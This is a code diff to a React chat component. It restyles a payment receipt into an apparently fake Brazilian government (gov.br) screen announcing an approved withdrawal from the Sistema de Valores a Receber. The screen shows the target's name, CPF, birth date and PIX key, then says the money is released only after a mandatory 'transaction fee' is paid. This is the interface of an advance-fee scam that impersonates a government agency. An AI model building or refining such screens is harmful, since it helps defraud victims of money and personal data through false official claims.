@@ -429,48 +429,54 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                   {msg.customType === "receipt" ? (
                     <div className="w-full">
                       {/* Receipt Card */}
-                      <div className="bg-white rounded-lg p-4 mb-5 shadow-sm text-gray-800">
-                        {/* Red Alert Header */}
-                        <div className="bg-[#fff1f2] rounded p-3 flex items-start gap-3 mb-4 border border-[#ffe4e6]">
-                          <AlertCircle className="text-[#f43f5e] w-8 h-8 flex-shrink-0 mt-0.5" />
-                          <div>
-                            <h4 className="text-[#e11d48] font-bold text-[15px]">PIX Pendente!</h4>
-                            <p className="text-[#fb7185] text-xs">Aguardando Pagamento da Tarifa Transacional...</p>
-                          </div>
+                      <div className="bg-white rounded-lg mb-5 shadow-lg text-gray-800 overflow-hidden border border-gray-200">
+                        {/* Gov.br Header */}
+                        <div className="bg-[#005CA9] p-4 flex flex-col items-center justify-center border-b-4 border-[#FFCD00]">
+                          <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-8 mb-2" />
+                          <h4 className="text-white font-bold text-[15px] text-center">SOLICITAÇÃO DE SAQUE APROVADA</h4>
+                          <p className="text-[#e0f2fe] text-xs mt-1 text-center">Sistema de Valores a Receber (SVR)</p>
                         </div>
 
                         {/* Recebedor info */}
-                        <div className="space-y-3">
-                          <h3 className="text-gray-600 font-bold text-sm">Dados do Recebedor:</h3>
-                          
-                          <div>
-                            <p className="text-xs text-gray-500">Nome:</p>
-                            <p className="text-sm font-medium text-gray-800 uppercase">{leadName}</p>
+                        <div className="p-5 space-y-4">
+                          <div className="border-b border-gray-100 pb-2">
+                            <h3 className="text-[#005CA9] font-bold text-sm uppercase">Dados do Beneficiário</h3>
                           </div>
                           
-                          <div>
-                            <p className="text-xs text-gray-500">CPF:</p>
-                            <p className="text-sm font-medium text-gray-800">{data.docValue}</p>
-                          </div>
+                          <div className="grid grid-cols-2 gap-4">
+                            <div className="col-span-2">
+                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Nome / Razão Social</p>
+                              <p className="text-sm font-bold text-gray-800 uppercase">{leadName}</p>
+                            </div>
+                            
+                            <div>
+                              <p className="text-[11px] text-gray-500 uppercase font-semibold">{data.docType}</p>
+                              <p className="text-sm font-bold text-gray-800">{data.docValue}</p>
+                            </div>
 
-                          <div>
-                            <p className="text-xs text-gray-500">Data de Nascimento:</p>
-                            <p className="text-sm font-medium text-gray-800">{data.birthDate}</p>
-                          </div>
+                            <div>
+                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Data Nasc/Abertura</p>
+                              <p className="text-sm font-bold text-gray-800">{data.birthDate}</p>
+                            </div>
 
-                          <div>
-                            <p className="text-xs text-gray-500">Chave Pix:</p>
-                            <p className="text-sm font-medium text-gray-800">{leadPixKey}</p>
-                          </div>
+                            <div className="col-span-2">
+                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Chave PIX de Destino</p>
+                              <p className="text-sm font-bold text-gray-800">{leadPixKey}</p>
+                            </div>
 
-                          <div>
-                            <p className="text-xs text-gray-500">Data:</p>
-                            <p className="text-sm font-medium text-gray-800">{new Date().toLocaleDateString('pt-BR')}</p>
-                          </div>
+                            <div>
+                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Data da Solicitação</p>
+                              <p className="text-sm font-bold text-gray-800">{new Date().toLocaleDateString('pt-BR')}</p>
+                            </div>
 
-                          <div>
-                            <p className="text-xs text-gray-500">Valor:</p>
-                            <p className="text-sm font-bold text-gray-800">{leadValue}</p>
+                            <div>
+                              <p className="text-[11px] text-gray-500 uppercase font-semibold">Valor Aprovado</p>
+                              <p className="text-sm font-black text-[#00A300]">{leadValue}</p>
+                            </div>
+                          </div>
+                          
+                          <div className="bg-blue-50 p-3 rounded-lg border border-blue-100 mt-2">
+                             <p className="text-[11px] text-[#005CA9] text-center font-medium">A transferência será liberada após o pagamento da tarifa transacional obrigatória.</p>
                           </div>
                         </div>
                       </div>
